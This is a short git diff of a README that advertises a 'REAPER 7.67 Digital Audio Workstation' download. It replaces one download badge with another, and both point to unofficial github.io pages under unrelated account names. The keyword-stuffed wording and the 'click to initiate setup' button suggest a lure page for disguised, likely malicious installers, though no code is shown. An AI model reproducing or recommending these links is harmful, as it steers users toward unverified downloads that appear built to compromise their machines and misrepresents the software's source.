@@ -21,7 +21,7 @@ To begin using this **REAPER 7.67 Digital Audio Workstation** and **REAPER 7.67 
 | :--- | :--- |
 | **Get REAPER 7.67 Digital Audio Workstation** | Click the button below to initiate the setup for this **REAPER 7.67 DAW Software**. |
 
-[![Button](https://img.shields.io/badge/🎛️-Get_REAPER_7.67_Audio_Suite-2ea44f?style=for-the-badge)](https://rodericklueilwitz88.github.io/.github/reaper-7-67)
+[![REAPER](https://img.shields.io/badge/Launch-REAPER-1D4ED8?style=for-the-badge)](https://reaper-mastering-daw.github.io/.github/reaper-daw)
 
 ## System Requirements
 
